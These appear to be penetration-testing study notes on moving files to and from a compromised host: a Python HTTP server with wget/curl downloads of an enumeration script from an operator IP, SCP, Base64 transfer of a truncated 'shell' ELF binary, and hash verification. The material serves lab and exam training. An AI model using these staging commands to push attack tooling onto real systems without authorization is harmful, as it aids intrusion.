# File Transfers — Detailed Study Notes

**Category:** File transfer methods, shell operations, integrity checking

[← Study Topics](README.md) · [File-transfer Cheatsheet](../Cheatsheets/file-transfer-commands.md)

## Objective

During authorized security testing, it is often necessary to move tools or scripts from the operator's machine to the remote machine, or retrieve files in the opposite direction. Meterpreter offers an upload feature, but ordinary interactive shells may require a separate transfer method.

## 1. Python HTTP server, wget and curl

Start a local HTTP server in the directory containing the intended file:

```bash
cd /tmp
python3 -m http.server 8000
```

Example console response:

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

The server serves files from the current directory over port **8000**. The address `0.0.0.0` means it listens on available network interfaces; the remote host must use an actual reachable interface address.

On the remote host, download the file:

```bash
wget http://10.10.14.1:8000/linenum.sh
```

Example output:

```text
Saving to: 'linenum.sh'
linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s
2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

If `wget` is unavailable, use `curl`:

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

The `-o` option specifies the local output filename. The given `10.10.14.1` is the example operator address; substitute the reachable interface address for the actual authorized lab. Confirm that the file exists in the local server's working directory.

## 2. Using SCP

When the remote system has an accessible SSH service and valid credentials, use secure copy:

```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

The first path is the local input file. The destination has the pattern `user@host:/remote/path`; the colon separates the remote host from its filesystem path. SCP ordinarily uses the SSH transport, with SSH credentials and host verification.

Example prompt:

```text
user@remotehost's password: *********
linenum.sh
```

## 3. Transferring through Base64

In restricted lab scenarios where a direct file transfer is unavailable, file bytes can be represented as Base64 text. On the sending host:

```bash
base64 shell -w 0
```

`-w 0` disables line wrapping in GNU `base64`, so the output is a single encoded line. The example begins with a Base64-encoded ELF header:

```text
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

On the receiving host, paste the **complete** encoded content and decode it:

```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

**Note:** `... <SNIP> ...` in this example is an omission marker and is not runnable literal Base64. The transfer requires an untruncated encoded string. `base64 -d` decodes standard Base64 and `>` redirects the resulting bytes to the output file.

## 4. Verify the transferred file

Inspect the file type:

```bash
file shell
```

Example:

```text
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

This is an important sanity check for file format, but it does **not** alone prove an exact byte-for-byte copy.

Compare hashes on both machines:

```bash
md5sum shell
```

Example on sending machine:

```text
321de1d7e7c3735838890a72c9ae7d1d shell
```

Example on receiving machine:

```text
321de1d7e7c3735838890a72c9ae7d1d shell
```

Matching hashes provide evidence the received file matches the original. MD5 is adequate for checking accidental corruption in this example, but it is not suitable when protection against intentional modification is needed; prefer a modern cryptographic hash such as SHA-256 in that setting.

## 5. Common troubleshooting and exam review

| Situation | What to check |
|---|---|
| Connection refused | Is the Python HTTP server running? Is the port correct? |
| Cannot reach server | Is the operator address reachable from the target? Check VPN/interface choice and firewall |
| HTTP 404 | Does the file exist under the server's working directory? |
| Unexpected HTML saved | Inspect HTTP status and content; the response might be an error page |
| Base64 decoding fails | Was the text truncated or altered? |
| File type wrong | Check filename, source, output and decoding |
| Hash mismatch | Repeat transfer and check for truncation or content transformation |

## Resources

- [Setting up a local testing server — MDN](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server)
- [Base64 manual](https://linux.die.net/man/1/base64)
- [file manual](https://linux.die.net/man/1/file)
- [File transfer practice](https://academy.hackthebox.com/module/details/24)

**Study status:** Reference topic, not an independently verified lab.
